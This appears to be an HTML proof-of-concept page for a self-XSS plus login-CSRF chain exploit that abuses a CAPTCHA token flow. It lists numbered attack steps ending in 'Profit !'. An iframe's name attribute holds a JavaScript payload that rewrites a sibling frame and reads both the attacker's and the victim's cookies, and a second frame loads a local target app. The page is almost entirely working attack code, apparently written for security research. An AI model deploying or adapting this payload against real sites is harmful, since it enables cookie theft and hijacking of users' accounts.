<!DOCTYPE html>
<html>
<body>
  <h1>Self-XSS + CSRF login with CAPTCHA Chain Exploit </h1>
  <h4>1. Login as victim on the right frame by clicking the login button</h4>
  <h4>2. Wait 5 seconds for the captcha token to be provided by the websocket server (emulating a captcha solving from another device for example)</h4>
  <h4>3. The automatic Login to attacker on reception of the token triggers the xss payload</h4>
  <h4>4. Profit !</h4>
  <iframe name="setTimeout(() => { window.top[1].document.body.innerHTML = 'edited by Kharaone</br>' + 'Our cookie is: ' + document.cookie + '</br>Victim cookie is: ' + window.top[1].document.cookie;}, 5000);" src="./csrf.html" width="40%" height="500px" credentialless></iframe>
  <iframe src="http://localhost:3001/home" width="40%" height="500px" ></iframe>
</body>
</html>